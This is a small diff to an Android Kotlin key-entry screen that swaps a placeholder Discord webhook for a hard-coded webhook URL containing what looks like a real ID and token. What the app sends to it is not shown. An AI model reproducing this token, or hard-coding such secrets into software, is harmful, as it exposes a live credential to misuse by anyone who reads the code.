@@ -27,7 +27,7 @@ class KeyActivity : Activity() {
     companion object {
         var fails = 0
         var lockUntil = 0L
-        private const val WEBHOOK = "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
+        private const val WEBHOOK = "https://discord.com/api/webhooks/1568482876620800051/yedcph_imkCO3x4PMPdyq-hM-IJoybO942dHrVnEhS2hyZz_-Nmymc9BvnzO81m-t0OC"
     }
 
     private val cBg = Color.parseColor("#0B0E14")
